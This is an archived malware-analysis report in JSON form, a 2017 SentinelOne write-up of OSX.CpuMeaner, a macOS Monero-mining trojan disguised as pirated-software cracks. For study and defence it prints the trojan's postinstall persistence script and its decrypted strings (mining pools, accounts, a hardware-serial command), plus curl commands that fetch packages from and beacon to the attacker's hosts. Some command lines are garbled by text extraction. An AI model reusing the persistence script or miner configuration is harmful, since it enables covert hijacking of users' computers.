{
    "id": "fe33e076-7998-4bfb-9d35-0be7764b4ce2",
    "created_at": "2023-01-12T15:04:06.392061Z",
    "updated_at": "2025-03-27T02:09:29.587658Z",
    "deleted_at": null,
    "sha1_hash": "e1be54a7f1f7907858b449a4420ce5eb4810cc98",
    "title": "2017-11-28 - OSX.CPUMEANER New Cryptocurrency Mining Trojan Targets MacOS",
    "authors": "",
    "file_creation_date": "2022-05-25T14:37:10Z",
    "file_modification_date": "2022-05-25T14:37:10Z",
    "file_size": 797069,
    "plain_text": "# New Crypto Mining Trojan Targets macOS\n\n**[sentinelone.com/blog/osx-cpumeaner-miner-trojan-software-pirates](https://www.sentinelone.com/blog/osx-cpumeaner-miner-trojan-software-pirates/)**\n\n### (Image source: Beware of traps, by Carmen)\n\n\nNovember 28, 2017\n\n\n### In this post, we analyze a new cryptocurrency mining trojan targeting macOS. The malware hides in the pledge to download pirated applications and secretly mines Monero crypto- currency with the user’s hardware.\n\n While the idea is similar to OSX.Pwnet, the means and method of implementation are closer to that of the adware industry.\n\n## Infection\n\n### Individuals using pirated software could end up with malware from a variety of sources including a simple Google search and a YouTube video with a malicious link in its description. In the middle of technical support scams, fake Flash players, and recommended virus scans, the victim could end up with a malicious package. The instance below shows a user looking for a crack of Sketch app:\n\n\n-----\n\n```\n$ curl -svJO http://jumpcash.xyz/download.php -G -d e=pkg -d tag=mosx3 -d\nclickid=2305343 -d key=\"Sketch 47 Crack\"\n*  Trying 46.30.45.236...\n* Connected to jumpcash.xyz (46.30.45.236) port 80 (#0)\n> GET /download.php?e=pkg&tag=mosx3&clickid=2305343&key=Sketch 47 Crack HTTP/1.1\n> Host: jumpcash.xyz\n> User-Agent: curl/7.43.0\n> Accept: */*\n>\n< HTTP/1.1 200 OK\n< Server: nginx/1.4.6 (Ubuntu)\n< Date: Tue, 14 Nov 2017 10:19:17 GMT\n< Content-Type: application/octet-stream\n< Content-Length: 169267\n< Connection: keep-alive\n< X-Powered-By: PHP/5.5.9-1ubuntu4.21\n< Content-Description: File Transfer\n< Content-Disposition: attachment; filename=Sketch_47_Crack-2305343823868397374412531.pkg\n< Content-Transfer-Encoding: binary\n< Expires: 0\n< Cache-Control: must-revalidate\n< Pragma: public\n<\n{ [936 bytes data]\n* Connection #0 to host jumpcash.xyz left intact\n$ shasum -a 256 Sketch_47_Crack-2305343-823868397374412531.pkg \n7a6cc593a8fb2853b817013e28681fa1698fd59d0cea69ba06b7a4b6dc3d5c80 Sketch_47_Crack2305343-823868397374412531.pkg\n\n```\n\n-----\n\n### The destination filename is generated using the key and the clickid queries. Of course, the downloaded package doesn’t contain any pirated software:\n\n The threat was also spotted on a French fake torrent site:\n\n\n-----\n\n### A few users complained about installed executables, xmemapp and cpucooler, on Apple forums. According to VirusTotal, the threat is in the wild, with a detection ratio of 0, since the second half of September 2017.\n\n## Package analysis\n\n### At the time of writing, 3 packages were available on the server:\n```\n$ for tag in mosx{1,2,3} ; do curl -s -o $tag.pkg http://jumpcash.xyz/download.php -G\n-d e=pkg -d tag=$tag ; done\n$ shasum -a 256 mosx*.pkg\nd15a51bb1a88a8906a997a0d4c0d3fb35ddd64b722af23120600eeea989ecef9 mosx1.pkg\nc3c0da504e40359ce8247b912cbff00cbd32a2222cb53a6bd30f2e44f7781049 mosx2.pkg\n7a6cc593a8fb2853b817013e28681fa1698fd59d0cea69ba06b7a4b6dc3d5c80 mosx3.pkg\n\n They are all signed using the same developer identity certificate:\n$ ls mosx*.pkg | xargs -L 1 pkgutil --check-signature | awk '/Developer ID\nInstaller/'\n  1. Developer ID Installer: Artur Nurgaliev (DEWCRD3789)\n  1. Developer ID Installer: Artur Nurgaliev (DEWCRD3789)\n  1. Developer ID Installer: Artur Nurgaliev (DEWCRD3789)\n\n Apple revoked the certificate on November 10, 2017:\n$ ls mosx*.pkg | xargs -L 1 spctl --assess -v --type install\nmosx1.pkg: CSSMERR_TP_CERT_REVOKED\nmosx2.pkg: CSSMERR_TP_CERT_REVOKED\nmosx3.pkg: CSSMERR_TP_CERT_REVOKED\n\n Package tagged mosx1 drops xmemapp, while packages tagged mosx2 or mosx3 drop cpucooler :\n$ for pkg in mosx*.pkg ; do echo $pkg: $(pkgutil --payload-files $pkg | egrep -v -e\n^\\.$) ; done\nmosx1.pkg: ./xmemapp\nmosx2.pkg: ./cpucooler\nmosx3.pkg: ./cpucooler\n\n Payload executables don’t have the same hash:\n$ for tag in mosx{1,2,3} ; do pkgutil --expand $tag.pkg $tag && tar xf $tag/Payload C $tag ; done\n$ shasum -a 256 mosx*/{x,c}*\nd196aba4d59b132fc9cd6f6ba627166a8eb6631017636b0ed4df7fd0260524a5 mosx1/xmemapp\n47e523a8b796c27b6c0fe91a4781aa7b47c8d66ddb75117d3f3283a6079ff128 mosx2/cpucooler\n5c41ab1d3aaa33e021eb73c1a58894df8e679366d2f03663b8f1029a0dc80f26 mosx3/cpucooler\n\n They are not code-signed:\n\n```\n\n-----\n\n```\n$ ls mosx /{x,c} | xargs L 1 codesign dvvv\nmosx1/xmemapp: code object is not signed at all\nmosx2/cpucooler: code object is not signed at all\nmosx3/cpucooler: code object is not signed at all\n\n### They are installed to different locations:\n$ for tag in mosx{1,2,3}; do echo $tag: $(xmllint --xpath \"string(//pkginfo/@install-location)\" $tag/PackageInfo) ; done\nmosx1: /Library/Application Support/XMemApp\nmosx2: /Library/Application Support/CpuCooler\nmosx3: /Library/Application Support/CpuCooler\n\n After installation, the package runs its postinstall script to:\n\n write the launchd.plist file to /Library/LaunchAgents for persistence; load the Launch Agent; wait 10 seconds and kill all processes with the executable name; wait 60 seconds in the background and run the executable, with the package name as an argument.\n\n This is the postinstall script for mosx2 and mosx3 packages:\n#!/bin/bash\nIDENTIFIER=\"com.osxext.cpucooler\"\nINSTALL_LOCATION=\"/Library/Application Support/CpuCooler/cpucooler\"\nLAUNCH_AGENT_PLIST=\"/Library/LaunchAgents/$IDENTIFIER.plist\"\necho '<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n  <key>Label</key>\n  <string>'$IDENTIFIER'</string>\n  <key>Program</key>\n  <string>'$INSTALL_LOCATION'</string>\n  <key>RunAtLoad</key>\n  <true/>\n</dict>\n</plist>' > \"$LAUNCH_AGENT_PLIST\"\nFILENAME=$(basename \"$1\")\n/bin/launchctl load \"$LAUNCH_AGENT_PLIST\"\nsleep 10 && sudo pkill cpucooler\nsleep 60 && /Library/Application\\ Support/CpuCooler/cpucooler \"$FILENAME\" &\nexit\n\n## Executable analysis\n\n```\n\n-----\n\n#### xmemapp and cpucooler are custom builds of XMRig version 2.3.1, an open-source\n### Monero CPU miner.\n\n The author added functions to de-obfuscate some strings and send feedback to a server:\n```\nPostback::sendPostback(std::string const&);\nUtils::Utils();\nUtils::encdec(std::string);\nUtils::exec(std::string const&);\nUtils::getNumber();\nUtils::hex_to_string(std::string const&);\nUtils::jenkins_one_at_a_time_hash(std::string, unsigned long);\nUtils::str_replace(std::string, std::string const&, std::string const&);\nUtils::~Utils();\n\n Default arguments are also set from the main() function. The hard-coded options are:\n\n URL of mining server -o ; username for mining server -u ; password for mining server -p x ; safe adjust threads and av settings for current CPU --safe ; number of miner threads -t 2 .\nUtils::encdec() decodes hexadecimal strings using Utils::hex_to_string() and\n\n decrypts the result with a XOR 0x4e :\n\n```\n\n-----\n\n```\n$ strings mosx3/cpucooler | egrep e [[:xdigit:]]+$ m 5\n27213c2b296e633c2a7f6e63397e6e632d6e0f3e3e222b0f060d070a273d250a3c27382b3c6e326e2f3925\n243b233e2d2f3d2660363734\n23213d367d\n3d3a3c2f3a3b23653a2d3e74616136233c603e212122602327202b3c292f3a2b602d2123747a7b7b787e\n232f3c3a27202439262b2b3a0e232f2722602d2123\n$ ../decrypt_strings.py mosx1/xmemapp mosx{2,3}/cpucooler\nDecrypted strings for: mosx1/xmemapp\nioreg -rd1 -w0 -c AppleAHCIDiskDriver | awk '/Serial Number/{gsub(\"\\\"\", \"\", $4);print\n$4}'\njumpcash.xyz\nmosx1\nstratum+tcp://xmr.pool.minergate.com:45560\njeffguyen@mail.com\nDecrypted strings for: mosx2/cpucooler\nioreg -rd1 -w0 -c AppleAHCIDiskDriver | awk '/Serial Number/{gsub(\"\\\"\", \"\", $4);print\n$4}'\njumpcash.xyz\nmosx2\nstratum+tcp://xmr.pool.minergate.com:45560\njeffguyen@mail.com\nDecrypted strings for: mosx3/cpucooler\nioreg -rd1 -w0 -c AppleAHCIDiskDriver | awk '/Serial Number/{gsub(\"\\\"\", \"\", $4);print\n$4}'\njumpcash.xyz\nmosx3\nstratum+tcp://xmr.pool.minergate.com:45560\nmartinjwheet@mail.com\n\n### These binaries use 2 threads (i.e. 200% of CPU) to mine on MinerGate XMR pool for jeffguyen@mail.com (mosx1, mosx2) and martinjwheet@mail.com (mosx3) accounts.\n\n When executed with real arguments (i.e. by the package postinstall script), main() looks for a - and a . in the first argument (the package name) and, when found, calls the Postback::sendPostback() function with the substring as a parameter.\nPostback::sendPostback() sends installation data to the decrypted domain name,\n\n notably using Utils::getNumber() :\n$ curl -A MNR -w \"%{http_code}\" http://jumpcash.xyz/pb.php -G -d t=mosx3 -d\nmid=2162179746 -d i=2305343-823868397374412531\n200\nUtils::getNumber() runs the decrypted ioreg command with Utils::exec() . The\n\n output is hashed using Jenkins’s one-at-a-time hash and converted to a decimal representation to be included in the request’s arguments.\n\n```\n\n-----\n\n```\nUtils::str_replace() and,\n\n### ironically, Utils::jenkins_one_at_a_time_hash() functions are not used (dead code).\n\n## MNR2 variants\n\n### After jumpcash.xyz domain was taken down, it didn’t take long for more variants to appear on other websites, here and there:\n$ for tag in mosx{2,3,np} ; do curl -s -o $tag.pkg\nhttp://storekit.xyz/api/v1/download.php -G -d e=pkg -d tag=$tag ; done\n$ shasum -a 256 *.pkg\nb6cbc89d0b5a8938c74c1f601a2b7a88b4a3391bf808d2c028885003a16d9b5a mosx2.pkg\nf1da940d6f417ef0001595ed816889ecdcacb41a3d6c921b6e039dc30e35ab8a mosx3.pkg\n6e0ec2d6754138b5971f417176136a7becfd75359919a8a5a3b4233aeaade9b3 mosxnp.pkg\n\n The packages use another, soon to be revoked, developer identity:\n\n```\n\n-----\n\n```\n$ ls mosx .pkg | xargs L 1 pkgutil check signature | awk /Developer ID\nInstaller/'\n  1. Developer ID Installer: Adam Kortney (9ADZ437492)\n  1. Developer ID Installer: Adam Kortney (9ADZ437492)\n  1. Developer ID Installer: Adam Kortney (9ADZ437492)\n$ ls mosx*.pkg | xargs -L 1 spctl --assess -v --type install\nmosx2.pkg: accepted\nsource=Developer ID\nmosx3.pkg: accepted\nsource=Developer ID\nmosxnp.pkg: accepted\nsource=Developer ID\n\n### Again, Apple revoked the certificate on November 22, 2017:\n\n Installed executables have new names and locations:\n$ for pkg in mosx*.pkg ; do echo $pkg: $(pkgutil --payload-files $pkg | egrep -v -e\n^\\.$) ; done\nmosx2.pkg: ./mxcpu\nmosx3.pkg: ./mxzcpu\nmosxnp.pkg: ./moszcpu\n$ for tag in mosx{2,3,np} ; do pkgutil --expand $tag.pkg $tag && tar xf $tag/Payload\n-C $tag ; done\n$ shasum -a 256 mosx*/m*cpu\n91b929d2470e3507b5faf5f12adb35046d96777e8b55b28b8e859a30924168b2 mosx2/mxcpu\nb636b2cc15925e68c200449d5d78a9e169af379e4e3b007075ded00d777ffdc7 mosx3/mxzcpu\n9a8b16f0a44cd63bf525142519b23481d4dcfd84d2dae02a0b0b9cb5caf1c147 mosxnp/moszcpu\n$ for tag in mosx{2,3,np}; do echo $tag: $(xmllint --xpath \"string(//pkginfo/@install-location)\" $tag/PackageInfo) ; done\nmosx2: /Library/Application Support/mxcpu\nmosx3: /Library/Application Support/mxzcpu\nmosxnp: /Library/Application Support/moszcpu\n\n Packages now have a preinstall script to exit with an error code if the machine is already infected by an older variant.\n\n Here is the new postinstall script workflow:\n\n write the launchd.plist file to /Library/LaunchAgents for persistence;\n\n```\n\n-----\n\n### exit if the machine is already trojanized; write the package name to /Library/Application Support/mosxnp/info file; load and start the Launch Agent; wait 5 seconds and check if the executable is running; if not, wait 30 seconds in the background and run the executable, with the package name as an argument; send an installation status request to the server.\n\n The new executables are now based on XMRig version 2.4.2. Custom functions are similar. main() now reads the package name from /Library/Application\n```\nSupport/mosxnp/info file.\n\n They are built for macOS Sierra or higher (10.12+), and crash on lower system versions:\n$ uname -v\nDarwin Kernel Version 15.6.0: Mon Aug 29 20:21:34 PDT 2016; root:xnu3248.60.11~1/RELEASE_X86_64\n$ ./mxzcpu \ndyld: lazy symbol binding failed: Symbol not found: _clock_gettime\n Referenced from: /Library/Application Support/mxzcpu/./mxzcpu (which was built for\nMac OS X 10.12)\n Expected in: /usr/lib/libSystem.B.dylib\ndyld: Symbol not found: _clock_gettime\n Referenced from: /Library/Application Support/mxzcpu/./mxzcpu (which was built for\nMac OS X 10.12)\n Expected in: /usr/lib/libSystem.B.dylib\nTrace/BPT trap: 5\n\n This can make sense, as macOS Sierra requires SSE4 enabled processors, and mining is much faster with this instruction set.\n\n Here are the decrypted strings:\n\n```\n\n-----\n\n```\n$ ../decrypt_strings.py mosx /m cpu\nDecrypted strings for: mosx2/mxcpu\nstorekit.xyz\nmosx2\nioreg -rd1 -w0 -c AppleAHCIDiskDriver | awk '/Serial Number/{gsub(\"\\\"\", \"\", $4);print\n$4}'\n/Library/Application Support/mxcpu/info\nstratum+tcp://xmr.pool.minergate.com:45560\njeffguyen@mail.com\nDecrypted strings for: mosx3/mxzcpu\nstorekit.xyz\nmosx3\nioreg -rd1 -w0 -c AppleAHCIDiskDriver | awk '/Serial Number/{gsub(\"\\\"\", \"\", $4);print\n$4}'\n/Library/Application Support/mxzcpu/info\nstratum+tcp://xmr.pool.minergate.com:45560\nmartinjwheet@mail.com\nDecrypted strings for: mosxnp/moszcpu\nstorekit.xyz\nmosxnp\nioreg -rd1 -w0 -c AppleAHCIDiskDriver | awk '/Serial Number/{gsub(\"\\\"\", \"\", $4);print\n$4}'\n/Library/Application Support/moszcpu/info\nstratum+tcp://xmr-eu1.nanopool.org:14444\n49dP6YfhFHmLWb16jESv8V977cYzbx8zCXz6A7gUh1sn65jQ1eQgUpG9qCs2mfNhVW9Jm86RQpDGTHxokFnutu\n\n### The variant tagged mosxnp mines on Nanopool XMR pool.\nPostback::sendPostback() now sends installation data to the URI /api/v1/pb.php on\n\n the host storekit.xyz with the User-Agent MNR2 .\n\n## VirusTotal samples\n\n### In mid-November 2017, a couple of packages, tagged mosx3 and mosxnp, reached VirusTotal.\n\n Their executables, cpulite and mosxnp, are MNR2 variants, but the postinstall script is slightly different.\n\n XMRig dependencies, libuv and libmicrohttpd, are not linked statically: symbols are imported. As the dynamic libraries are very likely to be missing on a target machine (Homebrew path), these executables crash at launch:\n\n```\n\n-----\n\n```\n$ otool L mosxnp\nmosxnp:\n  /usr/local/opt/libuv/lib/libuv.1.dylib (compatibility version 2.0.0, current\nversion 2.0.0)\n  /usr/local/opt/libmicrohttpd/lib/libmicrohttpd.12.dylib (compatibility version\n56.0.0, current version 56.0.0)\n  /usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 307.4.0)\n  /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version\n1238.0.0)\n$ ./mosxnp\ndyld: Library not loaded: /usr/local/opt/libuv/lib/libuv.1.dylib\n Referenced from: /Library/Application Support/mosxnp/./mosxnp\n Reason: image not found\nAbort trap: 6\n\n## Conclusion\n\n### This OSX.CpuMeaner is part of a larger trend of a new class of attacks as secret crypto mining attacks have popped up on Android, PC, Linux servers, and even Chrome with CoinHive miners. The fact is, criminals are always looking for ways to monetize infections and although Crypto-mining malware isn’t a traditional attack such as exfiltrating passwords and other sensitive data, remotely controlling the device, etc., the incentive is high and all you need is a little CPU alongside some innocent looking network communication.\n\n It is not 100% certain if these attacks will always be viable, but as long as the market continues to explode and people are seeing massive ROI for coins like Monero, DASH, etc., we will continue to see these attacks crop up.\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-11-28 - OSX.CPUMEANER New Cryptocurrency Mining Trojan Targets MacOS.pdf"
    ],
    "report_names": [
        "2017-11-28 - OSX.CPUMEANER New Cryptocurrency Mining Trojan Targets MacOS.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535846,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1653489430,
    "ts_modification_date": 1653489430,
    "files": {
        "pdf": "https://archive.orkl.eu/e1be54a7f1f7907858b449a4420ce5eb4810cc98.pdf",
        "text": "https://archive.orkl.eu/e1be54a7f1f7907858b449a4420ce5eb4810cc98.txt",
        "img": "https://archive.orkl.eu/e1be54a7f1f7907858b449a4420ce5eb4810cc98.jpg"
    }
}